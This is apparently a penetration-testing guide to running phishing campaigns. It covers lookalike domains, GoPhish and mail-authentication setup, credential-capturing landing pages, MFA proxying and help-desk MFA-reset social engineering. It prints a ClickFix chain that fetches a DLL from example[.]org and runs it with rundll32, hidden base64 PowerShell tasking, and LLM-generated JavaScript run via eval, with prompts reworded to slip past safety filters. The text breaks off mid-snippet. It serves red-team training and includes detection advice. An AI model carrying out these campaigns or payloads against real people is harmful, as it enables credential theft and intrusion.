# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. 피해자 조사
1. **victim domain** 선택.
2. 피해자가 사용하는 **login portals**를 **검색**하는 기본적인 web enumeration을 수행하고, 어떤 것을 **impersonate**할지 **결정**.
3. **OSINT**를 사용해 **emails** 찾기.
2. 환경 준비
1. phishing assessment에 사용할 **domain** 구매
2. 관련 email service 레코드(**SPF**, **DMARC**, **DKIM**, **rDNS**) 구성
3. **gophish**로 VPS 구성
3. 캠페인 준비
1. **email template** 준비
2. credentials를 훔치기 위한 **web page** 준비
4. 캠페인 실행!

## 유사한 domain name 생성 또는 신뢰할 수 있는 domain 구매

### Domain Name Variation Techniques

- **Keyword**: domain name에 원본 domain의 중요한 **keyword**가 **포함**됨 (예: zelster.com-management.com).
- **hypened subdomain**: subdomain의 **dot을 hyphen으로** 변경 (예: www-zelster.com).
- **New TLD**: 같은 domain에 **new TLD** 사용 (예: zelster.org)
- **Homoglyph**: domain name의 문자 하나를 **비슷하게 생긴 문자**로 **대체** (예: zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** domain name 내에서 두 문자를 **서로 바꿈** (예: zelsetr.com).
- **Singularization/Pluralization**: domain name 끝에 “s”를 추가하거나 제거 (예: zeltsers.com).
- **Omission**: domain name에서 문자 하나를 **제거** (예: zelser.com).
- **Repetition:** domain name의 문자 하나를 **반복** (예: zeltsser.com).
- **Replacement**: Homoglyph와 비슷하지만 덜 stealthy. domain name의 문자 하나를 바꾸며, 원래 문자 근처의 키보드 글자일 수도 있음 (예, zektser.com).
- **Subdomained**: domain name 안에 **dot**를 삽입 (예: ze.lster.com).
- **Insertion**: domain name에 문자 하나를 **삽입** (예: zerltser.com).
- **Missing dot**: TLD를 domain name에 덧붙임. (예: zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

**bit**이 저장되거나 전송되는 동안 solar flares, cosmic rays, hardware errors 같은 여러 요인으로 인해 **자동으로 뒤집힐 가능성**이 있다.

이 개념을 **DNS requests**에 **적용**하면, **DNS server가 받은 domain**이 처음 요청된 domain과 같지 않을 수 있다.

예를 들어, domain "windows.com"의 bit 하나를 수정하면 "windnws.com"으로 바뀔 수 있다.

공격자는 이를 **악용**해 피해자의 domain과 유사한 **multiple bit-flipping domains**를 등록할 수 있다. 목적은 정상 사용자를 자신의 infrastructure로 리디렉션하는 것이다.

자세한 내용은 [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)를 읽어라.

### 신뢰할 수 있는 domain 구매

[https://www.expireddomains.net/](https://www.expireddomains.net)에서 사용할 수 있는 expired domain을 검색할 수 있다.\
구매하려는 expired domain이 **이미 좋은 SEO**를 가지고 있는지 확인하려면 다음에서 어떻게 분류되는지 확인할 수 있다:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Emails 찾기

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

더 많은 valid email 주소를 **찾거나**, 이미 찾은 것들을 **검증**하려면 피해자의 smtp servers를 brute-force할 수 있는지 확인하면 된다. [email address를 검증/발견하는 방법은 여기에서 확인](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
또한 사용자가 메일 접근에 **web portal**을 사용한다면, 그 포털이 **username brute force**에 취약한지 확인하고 가능하면 그 취약점을 exploit하라.

## GoPhish 구성

### Installation

[https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)에서 다운로드할 수 있다.

이를 `/opt/gophish` 안에 다운로드하고 압축을 해제한 뒤 `/opt/gophish/gophish`를 실행하라\
출력에 port 3333의 admin user용 password가 표시된다. 따라서 해당 port에 접속해 그 credentials를 사용하여 admin password를 변경하라. 해당 port를 local로 tunnel해야 할 수도 있다:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### 구성

**TLS 인증서 구성**

이 단계 전에, 이미 사용할 **도메인**을 **구매**했어야 하며, 해당 도메인은 **gophish**를 구성하고 있는 **VPS의 IP**를 **가리키고** 있어야 합니다.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail configuration**

다음을 설치부터 시작: `apt-get install postfix`

그다음 다음 파일들에 도메인을 추가:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**또한 /etc/postfix/main.cf 내부의 다음 변수 값도 변경**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

마지막으로 **`/etc/hostname`** 및 **`/etc/mailname`** 파일을 도메인 이름으로 수정하고 **VPS를 재시작**하세요.

이제 **DNS A 레코드** `mail.<domain>`를 VPS의 **ip address**를 가리키도록 만들고, **DNS MX** 레코드를 `mail.<domain>`을 가리키도록 만드세요.

이제 이메일 전송을 테스트해봅시다:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish 구성**

gophish의 실행을 중지하고 설정을 진행하자.\
`/opt/gophish/config.json`을 다음과 같이 수정하자(https 사용에 주의):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish 서비스 구성**

gophish 서비스를 생성하여 자동으로 시작되고 service로 관리될 수 있도록 하려면 다음 내용을 포함하는 파일 `/etc/init.d/gophish`를 생성할 수 있습니다:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
서비스 구성을 완료하고 다음을 수행하여 확인합니다:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## 메일 서버와 도메인 구성

### 기다리고 정당하게 보이기

도메인이 오래될수록 spam으로 잡힐 가능성이 낮아집니다. 따라서 phishing assessment 전에 가능한 한 오래 기다려야 합니다(최소 1주). 또한, 평판이 좋은 분야에 대한 페이지를 올리면 얻는 평판이 더 좋아집니다.

1주를 기다려야 하더라도 지금 모든 구성을 마칠 수 있다는 점에 유의하세요.

### Reverse DNS (rDNS) 레코드 구성

VPS의 IP address가 도메인 이름으로 resolve되도록 rDNS (PTR) record를 설정하세요.

### Sender Policy Framework (SPF) 레코드

새 도메인에 대해 **SPF record를 구성해야 합니다**. SPF record가 무엇인지 모른다면 [**이 페이지를 읽어보세요**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

[https://www.spfwizard.net/](https://www.spfwizard.net) 을 사용해 SPF policy를 생성할 수 있습니다(VPS machine의 IP를 사용).

![phishing domain용 SPF record를 생성하기 위한 SPF Wizard form](<../../images/image (1037).png>)

이것은 domain 내부의 TXT record에 설정해야 하는 내용입니다:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### 도메인 기반 메시지 인증, 보고 및 적합성(DMARC) 레코드

새 도메인에 대해 **DMARC 레코드를 구성해야 합니다**. DMARC 레코드가 무엇인지 모른다면 [**이 페이지를 읽어보세요**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

호스트명 `_dmarc.<domain>`을 가리키는 새 DNS TXT 레코드를 생성하고, 다음 내용을 넣어야 합니다:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

새 도메인에 대해 DKIM을 **설정해야 합니다**. DMARC 레코드가 무엇인지 모른다면 [**이 페이지를 읽어보세요**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

이 튜토리얼은 다음을 기반으로 합니다: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> DKIM 키가 생성하는 두 B64 값을 연결해야 합니다:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### 이메일 설정 점수 테스트

[https://www.mail-tester.com/](https://www.mail-tester.com)을 사용해 할 수 있습니다\
페이지에 접속한 뒤 그들이 제공하는 주소로 이메일을 보내면 됩니다:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
You can also **이메일 구성을 확인**하기 위해 `check-auth@verifier.port25.com`으로 이메일을 보내고 **응답을 읽을** 수 있습니다(이를 위해서는 **포트** **25**를 **열어야** 하며, root로 이메일을 보낸 경우 파일 _/var/mail/root_에서 응답을 확인해야 합니다).\
모든 테스트를 통과했는지 확인하세요:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
또한 **당신이 통제하는 Gmail로 메시지**를 보낸 뒤, Gmail 받은편지함에서 **이메일 헤더**를 확인하면 `Authentication-Results` 헤더 필드에 `dkim=pass`가 있어야 합니다.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

The page [www.mail-tester.com](https://www.mail-tester.com) can indicate you if you your domain is being blocked by spamhouse. You can request your domain/IP to be removed at: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​You can request your domain/IP to be removed at [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- 발신자 프로필을 식별할 수 있는 **이름**을 설정하세요
- 피싱 이메일을 어느 계정에서 보낼지 결정하세요. 제안: _noreply, support, servicedesk, salesforce..._
- username과 password는 비워둘 수 있지만, Ignore Certificate Errors를 체크했는지 반드시 확인하세요

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> 모든 것이 제대로 동작하는지 테스트하려면 "**Send Test Email**" 기능을 사용하는 것이 좋습니다.\
> 테스트할 때 blacklist에 걸리지 않도록 **test email은 10min mail 주소로 보내는 것**을 권장합니다.

### Email Template

- 템플릿을 식별할 수 있는 **이름**을 설정하세요
- 그런 다음 **subject**를 작성하세요 (이상한 내용 말고, 일반 이메일에서 볼 법한 내용이면 됩니다)
- "**Add Tracking Image**"가 체크되어 있는지 확인하세요
- **email template**를 작성하세요 (다음 예시처럼 변수를 사용할 수 있습니다):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **이메일의 신뢰도를 높이기 위해**, 클라이언트의 이메일에서 사용한 signature를 일부 사용하는 것이 권장됩니다. 제안사항:

- **존재하지 않는 주소**로 이메일을 보내고 응답에 signature가 있는지 확인하기.
- info@ex.com, press@ex.com, public@ex.com 같은 **공개 이메일**을 찾아 이메일을 보내고 응답을 기다리기.
- **유효하게 발견된** 일부 이메일에 연락해 보고 응답을 기다리기

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template는 전송할 파일을 **첨부**하는 것도 허용합니다. 특수하게 제작된 파일/문서를 사용해 NTLM challenge를 훔치고 싶다면 [이 페이지](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)를 읽어보세요.

### Landing Page

- **이름**을 작성
- 웹 페이지의 **HTML code를 작성**하세요. 웹 페이지를 **import**할 수 있다는 점에 유의하세요.
- **Capture Submitted Data**와 **Capture Passwords**를 체크
- **redirection** 설정

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> 보통 페이지의 HTML code를 수정하고 로컬에서 테스트를 몇 번 해봐야 합니다(아마 Apache server를 사용해서) **결과가 마음에 들 때까지.** 그런 다음 그 HTML code를 박스에 작성하세요.\
> HTML에서 **static resources**를 사용해야 한다면(아마 일부 CSS와 JS pages) 그것들을 _**/opt/gophish/static/endpoint**_에 저장한 뒤 _**/static/\<filename>**_에서 접근할 수 있습니다.

> [!TIP]
> redirection의 경우 사용자를 피해자의 **정상 main web page로 redirect**하거나, 예를 들어 _/static/migration.html_로 redirect한 뒤, 5초 동안 **spinning wheel (**[**https://loading.io/**](https://loading.io)**)**
> 을 보여주고 그다음 프로세스가 성공했다고 알릴 수 있습니다.

### Users & Groups

- 이름 설정
- 데이터를 **Import** (예제 템플릿을 사용하려면 각 사용자의 firstname, last name, email address가 필요합니다)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

마지막으로 이름, email template, landing page, URL, sending profile, group을 선택해 campaign을 만드세요. URL은 피해자에게 보내질 link라는 점에 유의하세요.

**Sending Profile는 최종 phishing email이 어떻게 보일지 확인하기 위해 test email을 보낼 수 있게 해준다는 점**에 유의하세요:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> 테스트 이메일은 blacklist에 오르는 것을 피하기 위해 **10min mails 주소로 보내는 것**을 권장합니다.

모든 것이 준비되면, campaign을 시작하세요!

## Website Cloning

어떤 이유로든 website를 clone하고 싶다면 다음 페이지를 확인하세요:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

일부 phishing assessment(주로 Red Teams)에서는 **어떤 종류의 backdoor가 포함된 파일을 전송**하고 싶을 수도 있습니다(아마 C2이거나, 혹은 단순히 authentication을 유발하는 것일 수도 있습니다).\
예시를 보려면 다음 페이지를 확인하세요:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

이전 공격은 실제 website를 가장하고 사용자가 입력한 정보를 수집한다는 점에서 매우 영리합니다. 불행히도, 사용자가 올바른 password를 입력하지 않았거나, 또는 가장한 application이 2FA로 구성되어 있다면, **이 정보만으로는 속은 사용자를 가장할 수 없습니다**.

이럴 때 [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) 및 [**muraena**](https://github.com/muraenateam/muraena) 같은 도구가 유용합니다. 이 도구는 MitM 같은 공격을 생성할 수 있게 해줍니다. 기본적으로 공격은 다음 방식으로 동작합니다:

1. 실제 webpage의 login form을 **가장**합니다.
2. 사용자가 자신의 **credentials**를 당신의 fake page로 **보내면**, 도구가 그것을 실제 webpage로 보내 **credentials가 작동하는지 확인**합니다.
3. account가 **2FA**로 구성되어 있으면 MitM page가 그것을 요청하고, **사용자가 입력**하면 도구가 이를 실제 web page로 보냅니다.
4. 사용자가 authenticated 되면, 당신(공격자)은 도구가 MitM을 수행하는 동안 모든 interaction에서의 **credentials, 2FA, cookie 및 모든 정보**를 **캡처**하게 됩니다.

### Via VNC

원본과 똑같이 보이는 **악성 page로 피해자를 보내는 대신**, **실제 web page에 연결된 browser가 있는 VNC session으로 보내면** 어떨까요? 피해자가 무엇을 하는지 볼 수 있고, password, 사용된 MFA, cookies 등을 훔칠 수 있습니다...\
[**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)로 이 작업을 할 수 있습니다.

## Detecting the detection

당연히, 적발되었는지 아는 가장 좋은 방법 중 하나는 **당신의 domain을 blacklist에서 검색**하는 것입니다. 목록에 있다면, 어떤 방식으로든 해당 domain이 의심스러운 것으로 탐지된 것입니다.\
domain이 blacklist에 있는지 쉽게 확인하는 방법 중 하나는 [https://malwareworld.com/](https://malwareworld.com)을 사용하는 것입니다.

하지만, 피해자가 **현장에서 의심스러운 phishing activity를 적극적으로 찾고 있는지** 알아내는 다른 방법들도 있으며, 이는 다음에서 설명됩니다:


{{#ref}}
detecting-phising.md
{{#endref}}

피해자의 domain과 **매우 비슷한 이름의 domain을 구매**하고, 그리고/또는 당신이 제어하는 domain의 **subdomain에 대해 certificate를 생성**하되 그 안에 피해자 domain의 **keyword**를 포함시킬 수 있습니다. **피해자**가 이들과 어떤 종류의 **DNS 또는 HTTP interaction**이라도 수행하면, 그가 **의심스러운 domain을 적극적으로 찾고 있다**는 것을 알 수 있고, 매우 stealth하게 행동해야 합니다.

### Evaluate the phishing

[**Phishious** ](https://github.com/Rices/Phishious)를 사용해 이메일이 spam folder로 들어갈지, 차단될지, 아니면 성공할지 평가하세요.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

현대의 intrusion set은 점점 email lure를 완전히 건너뛰고 **service-desk / identity-recovery workflow를 직접 target**하여 MFA를 우회합니다. 공격은 완전히 "living-off-the-land" 방식입니다: 운영자가 유효한 credentials를 확보하면 내장 admin tooling으로 pivot하며, malware는 필요하지 않습니다.

### Attack flow
1. 피해자 recon
* LinkedIn, data breaches, public GitHub 등에서 개인 및 회사 세부정보를 수집합니다.
* 고가치 identity(executives, IT, finance)를 식별하고, password / MFA reset을 위한 **정확한 help-desk process**를 열거합니다.
2. 실시간 social engineering
* target을 가장하여 help-desk에 전화, Teams 또는 chat을 시도합니다(종종 **spoofed caller-ID** 또는 **cloned voice** 사용).
* 이전에 수집한 PII를 제공해 knowledge-based verification을 통과합니다.
* agent를 설득해 **MFA secret을 reset**하거나 등록된 mobile number에 대해 **SIM-swap**을 수행하게 합니다.
3. 즉시 사후 접근 작업(실제 사례에서는 ≤60 min)
* 어떤 web SSO portal을 통해 foothold를 확보합니다.
* built-in 도구만 사용해 AD / AzureAD를 열거합니다(binary drop 없음):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* 환경에서 이미 whitelist된 **WMI**, **PsExec**, 또는 합법적인 **RMM** agent로 lateral movement를 수행합니다.

### Detection & Mitigation
* help-desk identity recovery를 **privileged operation**으로 취급하고, step-up auth와 manager approval을 요구합니다.
* 다음을 경고하는 **Identity Threat Detection & Response (ITDR)** / **UEBA** rule을 배포합니다:
* MFA method changed + 새로운 device / geo에서의 authentication.
* 동일 principal의 즉각적인 elevation(user-→-admin).
* help-desk 통화를 기록하고, 어떤 reset 전에 이미 등록된 번호로의 **call-back**을 강제합니다.
* 새로 reset된 account가 자동으로 높은 권한 token을 상속하지 않도록 **Just-In-Time (JIT) / Privileged Access**를 구현합니다.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crew는 대규모 공격으로 고비용 high-touch ops를 상쇄하며, **search engines & ad networks를 delivery channel로 전환**합니다.

1. **SEO poisoning / malvertising**은 `chromium-update[.]site` 같은 fake result를 search ads 상단으로 밀어 올립니다.
2. 피해자는 작은 **first-stage loader**(종종 JS/HTA/ISO)를 다운로드합니다. Unit 42가 본 예:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. loader는 browser cookies + credential DB를 exfiltrate한 뒤, **silent loader**를 불러와 실시간으로 무엇을 배포할지 결정합니다:
* RAT(예: AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component(registry Run key + scheduled task)

### Hardening tips
* 새로 등록된 domain을 차단하고, email뿐 아니라 *search-ads*에도 **Advanced DNS / URL Filtering**을 적용합니다.
* 소프트웨어 설치를 signed MSI / Store packages로 제한하고, 정책으로 `HTA`, `ISO`, `VBS` 실행을 거부합니다.
* browser의 child process가 installer를 여는지 모니터링합니다:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* first-stage loader가 자주 악용하는 LOLBins(`regsvr32`, `curl`, `mshta` 등)를 hunt합니다.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: **Update** 버튼이 있는 cloned national CERT advisory로, 단계별 “fix” instructions를 보여줍니다. 피해자에게 DLL을 다운로드해 `rundll32`를 통해 실행하는 batch를 실행하라고 지시합니다.
* 일반적으로 관찰되는 batch chain:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest`가 payload를 `%TEMP%`에 떨어뜨리고, 짧은 sleep이 network jitter를 숨긴 뒤, `rundll32`가 exported entrypoint(`notepad`)를 호출합니다.
* DLL은 host identity를 beaconing하고 몇 분마다 C2를 polling합니다. 원격 tasking은 **base64-encoded PowerShell**로 도착하며, 숨김 상태와 policy bypass로 실행됩니다:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* 이는 C2 유연성을 유지하고(server가 DLL 업데이트 없이 작업을 교체 가능), console window를 숨깁니다. `rundll32.exe`의 child로 `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` 조합을 hunt하세요.
* Defenders는 `...page.php?tynor=<COMPUTER>sss<USER>` 형식의 HTTP(S) callback과 DLL 로드 후 5분 간격 polling을 찾을 수 있습니다.

---

## AI-Enhanced Phishing Operations
공격자들은 이제 **LLM & voice-clone APIs**를 결합해 완전히 개인화된 lure와 실시간 상호작용을 수행합니다.

| Layer | 위협 행위자의 예시 사용 |
|-------|-----------------------------|
|Automation|무작위 문구와 추적 링크를 넣어 10만 건 이상의 email / SMS를 생성 및 전송.|
|Generative AI|공개 M&A나 소셜 미디어의 내부 농담을 언급하는 *one-off* email 생성; 콜백 사기에서 CEO voice deep-fake 사용.|
|Agentic AI|도메인을 자율 등록하고, open-source intel을 스크래핑하며, 피해자가 클릭했지만 credentials를 제출하지 않았을 때 다음 단계 mail을 작성.|

**Defense:**
• ARC/DKIM anomalies를 통해 신뢰할 수 없는 automation에서 전송된 message를 강조하는 **dynamic banners**를 추가합니다.
• 고위험 전화 요청에는 **voice-biometric challenge phrases**를 배포합니다.
• awareness 프로그램에서 AI-generated lure를 지속적으로 시뮬레이션합니다. static templates는 더 이상 유효하지 않습니다.

또한 보세요 – credential phishing을 위한 agentic browsing abuse:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

또한 보세요 – secrets inventory 및 detection을 위한 AI agent의 local CLI tools와 MCP abuse:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

공격자들은 겉보기에는 benign한 HTML을 전달하고, **trusted LLM API에 JavaScript를 요청한 뒤 browser에서 실행**하여 stealer를 runtime에 생성할 수 있습니다(예: `eval` 또는 dynamic `<script>`).

1. **Prompt-as-obfuscation:** prompt에 exfil URL/Base64 strings를 인코딩하고, 안전 필터를 우회하고 hallucination을 줄이기 위해 wording을 반복 조정합니다.
2. **Client-side API call:** 로드 시 JS가 public LLM(Gemini/DeepSeek/etc.) 또는 CDN proxy를 호출합니다. static HTML에는 prompt/API call만 존재합니다.
3. **Assemble & exec:** 응답을 이어 붙여 실행합니다(방문마다 polymorphic):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** 생성된 코드가 lure를 개인화하고(예: LogoKit token parsing), creds를 prompt-hidden endpoint로 전송한다.

**Evasion traits**
- 트래픽이 잘 알려진 LLM domains 또는 평판이 좋은 CDN proxies로 향하며; 때로는 backend로의 WebSockets를 통해서도 발생한다.
- static payload가 없고; 악성 JS는 render된 뒤에만 존재한다.
- non-deterministic generations는 세션마다 **unique** stealers를 생성한다.

**Detection ideas**
- JS가 enabled된 sandboxes를 실행하고; **runtime `eval`/LLM responses에서 나온 동적 script creation**을 flag한다.
- LLM APIs로의 front-end POST 직후 반환 텍스트에 대해 `eval`/`Function`이 호출되는지 hunt한다.
- client traffic에서 unsanctioned LLM domains와 그 뒤이어 발생하는 credential POSTs를 alert한다.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
classic push-bombing 외에도, operator는 help-desk call 중에 단순히 **새 MFA registration을 강제로 수행**하여 사용자의 기존 token을 무력화한다. 이후의 login prompt는 피해자에게 정상적인 것으로 보인다.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
AzureAD/AWS/Okta 이벤트에서 **`deleteMFA` + `addMFA`**가 **같은 IP에서 몇 분 내**에 발생하는지 모니터링하세요.



## Clipboard Hijacking / Pastejacking

공격자는 침해되었거나 typosquatted된 웹페이지에서 악성 명령을 피해자의 clipboard에 몰래 복사한 뒤, 사용자가 이를 **Win + R**, **Win + X** 또는 terminal window에 붙여넣도록 속여, 다운로드나 첨부파일 없이 임의 코드를 실행하게 할 수 있습니다.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* lure page(예: 가짜 ministry/CERT “channel”)가 WhatsApp Web/Desktop QR을 표시하고 피해자에게 스캔하라고 안내하며, 공격자를 **linked device**로 몰래 추가합니다.
* 공격자는 세션이 제거될 때까지 즉시 chat/contact visibility를 얻습니다. 피해자는 나중에 “new device linked” 알림을 볼 수 있으며, 방어자는 신뢰할 수 없는 QR page 방문 직후의 예상치 못한 device-link 이벤트를 추적할 수 있습니다.

### Mobile‑gated phishing to evade crawlers/sandboxes
운영자들은 desktop crawlers가 최종 page에 도달하지 못하도록 간단한 device check 뒤에 phishing flow를 점점 더 자주 배치합니다. 일반적인 패턴은 touch-capable DOM인지 테스트한 뒤 결과를 server endpoint로 전송하는 작은 script이며; non‑mobile client는 HTTP 500(또는 blank page)을 받고, mobile user에게는 전체 flow가 제공됩니다.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logic (simplified):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
